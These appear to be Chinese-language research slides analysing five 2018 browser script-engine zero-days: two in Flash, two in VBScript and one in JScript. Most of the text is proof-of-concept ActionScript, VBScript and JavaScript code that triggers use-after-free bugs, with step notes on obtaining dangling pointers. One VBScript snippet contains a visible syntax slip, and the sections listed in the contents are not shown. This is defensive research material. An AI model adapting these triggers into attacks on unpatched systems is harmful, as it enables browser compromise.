# 2018年浏览器脚本引擎零日漏洞

## 作者
Elliot Cao  
Trend Micro  
2019-05-30

### 个人简介
- 在加入安全行业之前，是一名电气工程师。
- 2017年加入趋势科技，担任沙箱开发人员。
- 从2018年开始专注于研究浏览器漏洞，特别是浏览器脚本引擎。
- 微博账号: @elli0tn0phacker

## 目录
- 2018年的浏览器零日漏洞
- VBSEmulator
- Chakra

## 2018年的浏览器零日漏洞

### Flash 零日漏洞
- **CVE-2018-4878**
- **CVE-2018-15982**

#### CVE-2018-4878
```actionscript
var psdk:PSDK = PSDK.pSDK;
var psdk_dispatcher:PSDKEventDispatcher = psdk.createDispatcher();
this.mediaPlayer = psdk.createMediaPlayer(psdk_dispatcher);
this.my_DRMListerner = new DRMOperationCompleteListener ();
this.mediaPlayer.drmManager.initialize(this.my_DRMListerner);
this.my_DRMListerner = null;

try {
    new LocalConnection().connect("foo");
    new LocalConnection().connect("foo");
} catch (e:Error) {
    my_DRMListerner_vuln = new DRMOperationCompleteListener ();
}
```
- **创建对象**: 创建一个 `DRMOperationCompleteListener` 对象并将其初始化。
- **释放对象**: 将 `my_DRMListerner` 设置为 `null`。
- **重用释放内存**: 通过触发垃圾回收（GC）获得一个悬挂指针。

#### CVE-2018-15982
```actionscript
var ba:ByteArray = new ByteArray();
var md:Metadata = new Metadata();
var arr_key:* = null;
i = 0;
while (i < 0x100) {
    md.setObject(i.toString(), ba);
    i++;
}

try {
    new LocalConnection().connect("foo");
    new LocalConnection().connect("foo");
} catch (e:Error) {}

arr_key = md.keySet;
```
- **创建一些String对象**：将这些对象保存到 `Metadata` 中。
- **触发 GC**：通过触发垃圾回收（GC）获得一个悬挂指针。

### VBScript 零日漏洞
- **CVE-2018-8174**
- **CVE-2018-8373**

#### CVE-2018-8174
```vbscript
Dim arr(1)
Dim o

Class MyClass
    Private Sub Class_Terminate
        Set o = arr(0)
        arr(0) = &h12345678
    End Sub
End Class

Set arr(0) = New MyClass
Erase arr
msgbox o
```
- **创建对象**：创建一个 `MyClass` 对象并将指针保存到 `arr(0)`。
- **释放对象**：通过 `Erase arr` 释放数组。
- **获得悬挂指针**：在 `Class_Terminate` 方法中将 `o` 指向已释放的 `arr(0)`。

#### CVE-2018-8373
```vbscript
Dim arr()
ReDim arr(2)

Class MyClass
    Public Default Property Get P
        ReDim arr(1)
    End Sub
End Class

arr(2) = New MyClass
```
- **将 `arr(2)` 地址保存在栈中**。
- **原数组缓冲区被释放**：通过 `ReDim` 重新分配数组大小。
- **获得悬挂指针**：通过 `ReDim` 释放原数组缓冲区后，`arr(2)` 成为悬挂指针。

### JScript 零日漏洞
- **CVE-2018-8653**

```javascript
for (var i = 0; i < limit; i++) {       
    var arr = new Array({prototype:{}});
    var e = new Enumerator(arr);
    e.moveFirst();
    refs[i] = e.item();
}

for (var i = 0; i < limit; i++) {
    refs[i].prototype = {};
    refs[i].prototype.isPrototypeOf = getFreeRef;
}

dummyObj instanceof refs[0];

function getFreeRef() {            
    if (count == limit) {                      
        for (var i = 0; i < limit; i++) {
            refs[i].prototype = 0;
        }
        CollectGarbage();               
    } else {
        dummyObj instanceof refs[count++];
    }            
    // crash here
    this;           
    return false;
}
```
- **创建对象数组**：创建一个包含原型对象的对象数组。
- **设置回调函数**：将原型对象的 `isPrototypeOf` 方法设置为 `getFreeRef` 回调函数。
- **调用回调函数**：通过递归调用将 `this` 保存在栈上。
- **释放原型对象**：通过垃圾回收（GC）释放原型对象，导致崩溃。